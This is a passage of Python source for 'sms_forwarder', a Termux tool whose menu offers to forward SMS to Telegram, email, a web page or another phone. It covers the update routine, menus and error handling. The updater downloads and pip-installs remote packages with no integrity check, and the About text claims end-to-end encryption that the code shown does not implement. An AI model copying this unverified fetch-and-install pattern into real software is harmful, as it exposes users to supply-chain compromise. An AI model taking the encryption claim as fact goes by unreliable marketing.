{white}Installing Building dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}Installing Building DEpendencies{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}Installing Building DePendencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}Installing Building DepEndencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}Installing Building DepeNdencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}Installing Building DepenDencies{blue}...{reset}', f'{reset}{bold}{yellow}⠇  {white}Installing Building DependEncies{blue}...{reset}', f'{reset}{bold}{yellow}⠏  {white}Installing Building DependeNcies{blue}...{reset}', f'{reset}{bold}{yellow}⠋  {white}Installing Building DependenCies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}Installing Building DependencIes{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}Installing Building DependenciEs{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}Installing Building DependencieS{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}Installing Building Dependencies{blue}...{reset}']
                for anim in animation:
                    sys.stdout.write(center(anim, False)+'\r')
                    sleep(0.05)
            DEPENDENCIES.join()
            
            with open(version_config, "w") as file:
                file.write('{"usageleft": 2}')
            banner()
            echo_top()
            echo(f"{reset}{bold}{white}Update sucessfully completed{reset}")
            echo(f"{reset}{bold}{white}for start now just type{reset}")
            echo_bottom()
            print()
            echo_top()
            cdir = os.getcwd().replace("\\", "/")
            with open(toolname + "/.info") as file : run = json.loads(file.read())["main"]
            echo(f"{reset}{bold}{yellow}cd ../{toolname}{reset}")
            echo(f"{reset}{bold}{yellow}python{execute()} {lightcyan}{run}{reset}")
            echo_bottom()
            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle command copied on clipboard !")
            sleep(1)
            subprocess.getoutput(f"timeout 3 termux-clipboard-set python{execute()} {cdir}/{toolname}/{run}")
            exit()
        else:
            root_path = pip.__path__[0]
            os.chdir(root_path)
            os.chdir("..")
            os.chdir("TWK5XME9V704")
            shutil.rmtree(_toolname_)
            repository_list = requests.get("https://raw.githubusercontent.com/GreyTechno/gtci/main/programs/.programs").json()
            repository_name = _toolname_
            url = repository_list[repository_name]['zipurl'] + "?raw=true"
            dependencies = repository_list[repository_name]['dependencies']
            rname = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 7))
            zipname = url.split("/")[-1].split(".")[0]
            toolname = url.split("/")[4]
            banner()
            def _response():
                response = requests.get(url)
                with open(f"{rname}.zip", 'wb') as f:
                    f.write(response.content)
            content = threading.Thread(target=_response)
            content.start()
            while content.is_alive():
                for anim in update_animation:
                    sys.stdout.write(center(anim, False)+'\r')
                    sleep(0.05)
            content.join()
            with zipfile.ZipFile(f"{rname}.zip", "r") as zip: zip.extractall(f"{rname}")
            os.remove(f"{rname}.zip")
            cdir = os.getcwd().replace("\\", "/")
            shutil.copytree(f"{cdir}/{rname}/{toolname}-{zipname}", toolname)
            shutil.rmtree(rname)
            banner()
            Dependencies = lambda: [subprocess.getoutput(f"pip{execute()} install {i}") for i in dependencies]
            DEPENDENCIES = threading.Thread(target=Dependencies)
            DEPENDENCIES.start()
            while DEPENDENCIES.is_alive():
                animation = [f'{reset}{bold}{yellow}⠋  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}INstalling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}InStalling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}InsTalling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}InstAlling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}InstaLling Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠇  {white}InstalLing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠏  {white}InstallIng Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠋  {white}InstalliNg Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}InstallinG Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}Installing building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}Installing BUilding Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}Installing BuIlding Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}Installing BuiLding Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}Installing BuilDing Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠇  {white}Installing BuildIng Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠏  {white}Installing BuildiNg Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠋  {white}Installing BuildinG Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}Installing Building dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}Installing Building DEpendencies{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}Installing Building DePendencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}Installing Building DepEndencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}Installing Building DepeNdencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}Installing Building DepenDencies{blue}...{reset}', f'{reset}{bold}{yellow}⠇  {white}Installing Building DependEncies{blue}...{reset}', f'{reset}{bold}{yellow}⠏  {white}Installing Building DependeNcies{blue}...{reset}', f'{reset}{bold}{yellow}⠋  {white}Installing Building DependenCies{blue}...{reset}', f'{reset}{bold}{yellow}⠙  {white}Installing Building DependencIes{blue}...{reset}', f'{reset}{bold}{yellow}⠹  {white}Installing Building DependenciEs{blue}...{reset}', f'{reset}{bold}{yellow}⠸  {white}Installing Building DependencieS{blue}...{reset}', f'{reset}{bold}{yellow}⠼  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠴  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠦  {white}Installing Building Dependencies{blue}...{reset}', f'{reset}{bold}{yellow}⠧  {white}Installing Building Dependencies{blue}...{reset}']
                for anim in animation:
                    sys.stdout.write(center(anim, False)+'\r')
                    sleep(0.05)
            DEPENDENCIES.join()

            with open(version_config, "w") as file:
                file.write('{"usageleft": 2}')
            banner()
            print()
            echo_top()
            echo(f"{reset}{bold}{white}Update sucessfully completed{reset}")
            echo(f"{reset}{bold}{white}for start now just type{reset}")
            echo_bottom()
            echo_top()
            echo(f"{reset}{bold}{yellow}gtci {red}run {blue}{toolname}{reset}")
            echo_bottom()
            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle command copied on clipboard !")
            sleep(1)
            subprocess.getoutput(f"timeout 3 termux-clipboard-set gtci run {toolname}")
            exit()
    else: main_menu(), exit()

def help():
    def summery():
        banner()
        print()
        echo_top()
        echo(f"{bold}{blue}1. {yellow}Forward SMS Termux To Termux{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Allows you to forward SMS messages from one Termux instance to another.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}2. {yellow}Forward SMS In Telegram{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Enables forwarding of SMS messages to a Telegram chat or group.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}3. {yellow}Forward SMS On Web Page{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Provides an option to view and forward SMS messages through a web page interface.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}4. {yellow}Forward SMS Via Email{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Allows you to send SMS messages to an email address.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}5. {yellow}Forward SMS To Phone{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Forwards SMS messages to another phone number.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}6. {yellow}Update{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Check for updates and update the application if necessary.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}7. {yellow}Help{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Display this help menu to guide you through the available options.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}8. {yellow}About{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Learn more about the application, its version, and creators.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}9. {yellow}More{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Access additional features or options not listed here.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{bold}{blue}10. {yellow}Exit{reset}")
        echo("══", red+"╠", "╣", "═")
        for text in handle_text_overflow("Quit the application.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
        print()
        echo_top()
        for text in handle_text_overflow("Choose the option number to access its functionality or type 'Exit' to quit the application.", total_area() - 6):
            echo(f"{reset}{bold}{white}{text}{reset}")
        echo_bottom()
    def video():
        banner()
        print()
        echo_top()
        echo(f"{reset}{bold}{white}Video Not Available...{reset}")
        echo_bottom()
        print()
        echo_top()
        echo(f"{reset}{bold}{lightcyan}For Back Press Enter{reset}")
        echo("══", red+"╠", "╝", "═")
        echo("  ", red+"║", " ")
        center_input(f"╚════► {yellow}")
        help()

    banner()
    echo_top()
    echo(f"{yellow}Help Menu{reset}")
    echo_bottom()
    options = [
        "Read summery",
        "Watch video",
        "Back",
        "Exit"
        ]
    tempvar = []
    count = 0
    for _ in options: tempvar.append(len(_))
    echo_top()
    echo(f"{reset}{bold}{blue}Choose An Option{reset}")
    echo_bottom()
    print()
    for _ in options: count += 1; center(f"{bold}{magenta} [{white}0{count}{magenta}]  {yellow}{_}{space(max(tempvar) - len(_))}{reset}")
    print()
    echo("══", red+"╔", "═", "═")
    echo("  ", red+"║", " ")
    Input = center_input(f"╚════► {yellow}").lower()
    if (Input == "1") or (Input == "01") or (Input == "one"): summery()
    elif (Input == "2") or (Input == "02") or (Input == "two"): video()
    elif (Input == "3") or (Input == "03") or (Input == "three"): main_menu()
    elif (Input == "4") or (Input == "04") or (Input == "four"): program_exit()
    else:
        echo_top()
        echo(f"{magenta}Invalid option try again.{reset}")
        echo_bottom()
        sleep(2)
        help()
    options = ["Back to help menu", "Back to main menu", "Exit"]
    tempvar = []
    count = 0
    for _ in options: tempvar.append(len(_))
    print()
    echo_top()
    echo(f"{reset}{bold}{blue}Choose A Valid Option{reset}")
    echo("══", red+"╠", "╣", "═")
    echo("  ")
    for _ in options: count += 1; echo(f"{magenta} [{white}0{count}{magenta}]  {yellow}{_}{space(max(tempvar) - len(_))}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    Input = center_input(f"╚════► {yellow}")
    if (Input == "1") or (Input == "01") or (Input == "one"): help()
    elif (Input == "2") or (Input == "02") or (Input == "two"): main()
    elif (Input == "3") or (Input == "03") or (Input == "three"): program_exit()
    else:
        echo_top()
        echo(f"{reset}{bold}{magenta}Invalid option{reset}")
        echo_bottom()
        sleep(2)
        help()

def about():
    banner()
    print()
    echo_top()
    echo(f"{bold}{white}About sms_forwarder{reset}")
    echo("══", red+"╠", "╣", "═")
    for text in handle_text_overflow("sms_forwarder can be used in Termux to forward text messages from one device to another using Linux command-line utilities. The advantages of using sms_forwarder in Termux are that it allows users to automate the SMS forwarding process using Python scripts and provides a secure way to forward messages. It employs end-to-end encryption to ensure that the messages are not intercepted or read by unauthorized parties, offering advanced functionality and customization options that are not typically available on other platforms. Furthermore, sms_forwarder in Termux offers a variety of SMS forwarding options, including forwarding via phone number, email, between Termux instances, displaying on a web page, and forwarding to Telegram. This versatility makes sms_forwarder a valuable tool for individuals who want to maintain seamless connectivity across multiple devices", total_area() - 6):
        echo(f"{reset}{bold}{white}{text}{reset}")
    echo_bottom()
    print()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}For Back Press Enter{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    center_input(f"╚════► {yellow}")
    main_menu()
    exit()

def more():
    banner()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}Find More Tools From Us{reset}")
    echo("══", red+"╠", "╣", "═")
    echo(f"{reset}{bold}{blue}{github_page}{reset}")
    echo_bottom()
    print()
    print()
    try:
        os.startfile(github_page)
    except:
        subprocess.getoutput(f"termux-open-url {github_page}")
    echo_top()
    echo(f"{reset}{bold}{lightcyan}For Back Press Enter{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    center_input(f"╚════► {yellow}")
    main_menu()
    exit()



def main_menu():
    banner()
    options = [
        "Termux To Termux",
        "On Telegram",
        "On A Web Page",
        "On Email",
        "On Mobile Phone",
        "Update",
        "Help",
        "About",
        "More",
        "Exit"
        ]
    tempvar, count = [], 0
    for _ in options: tempvar.append(len(_))

    echo_top()
    echo(f"{reset}{bold}{white}Select A SMS Forwarding Method{reset}")
    echo_bottom()
    print()
    
    for _ in options:
        count += 1
        if len(str(count)) == 2:
            center(f"{bold}{magenta} [{white}{count}{magenta}]  {reset}{yellow}{_}{space(max(tempvar) - len(_))}{reset}")
        else:
            center(f"{bold}{magenta} [{white}0{count}{magenta}]  {reset}{yellow}{_}{space(max(tempvar) - len(_))}{reset}")

    
    print()
    echo("══", red+"╔", "═", "═")
    echo("  ", red+"║", " ")
    user_commands = center_input(f"╚════► {yellow}").lower()

    if   (user_commands == "1") or (user_commands == "01") or (user_commands == "one") or (user_commands == "termux"):
        if internet(): on_termux()
        else: check_internet()
    elif (user_commands == "2") or (user_commands == "02") or (user_commands == "two") or (user_commands == "telegram"):
        if internet(): on_telegram()
        else: check_internet()
    elif (user_commands == "3") or (user_commands == "03") or (user_commands == "three") or (user_commands == "web"):
        if internet(): on_webpage()
        else: check_internet()
    elif (user_commands == "4") or (user_commands == "04") or (user_commands == "four") or (user_commands == "email"):
        if internet(): on_email()
        else: check_internet()
    elif (user_commands == "5") or (user_commands == "05") or (user_commands == "five") or (user_commands == "phone"):
        on_phone()
    elif (user_commands == "6") or (user_commands == "06") or (user_commands == "six") or (user_commands == "update"):
        if internet(): update()
        else: check_internet()
    elif (user_commands == "7") or (user_commands == "07") or (user_commands == "seven") or (user_commands == "help"):
        help()
    elif (user_commands == "8") or (user_commands == "08") or (user_commands == "eight") or (user_commands == "about"):
        about()
    elif (user_commands == "9") or (user_commands == "09") or (user_commands == "nine") or (user_commands == "more"):
        if internet(): more()
        else: check_internet()
    elif (user_commands == "10") or (user_commands == "10") or (user_commands == "ten") or (user_commands == "exit"):
        program_exit()
    else:
        echo_top()
        echo(f"{reset}{bold}{magenta}Invalid Option{reset}")
        echo_bottom()
        sleep(1)
        del user_commands
        main_menu()


def main():
    banner()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}Please Wait...{reset}")
    echo_bottom()

    try:
        if not termux_api():
            banner()
            echo_top()
            echo(f"{reset}{bold}{white}Termux-API Not Found{reset}")
            echo(f"{reset}{bold}{white}Install Termux-API From F-Droid{reset}")
            echo_bottom()
            exit()
        elif internet(): check_version()
        main_menu()
    except KeyboardInterrupt : program_exit(True)
    except Exception as exc :
        try:
            last_line = []
            traceback_info = traceback.format_exc()  # Get the traceback information as a string
            lines = traceback_info.splitlines()  # Split the traceback text into lines
            for line in lines:
                if "File" in line:
                    line_number = line.split(", line ")[1].split(",")[0]
                    last_line.append(line_number)
            print()
            print(f"\n{bold}{magenta}[{red}-{magenta}] line number {str(last_line[-1])}")
        except: pass
        print(f"\n{bold}{magenta}[{red}!{magenta}] {lightcyan}{exc}")
        print()
        print(f"{bold}{white}[{red}+{magenta}] {white}Report this bug at {blue}{github_link}/issues")
        try : os.startfile(f"{github_link}/issues")
        except: subprocess.getoutput(f"termux-open-url {github_link}/issues")


if __name__ == "__main__":
    main()

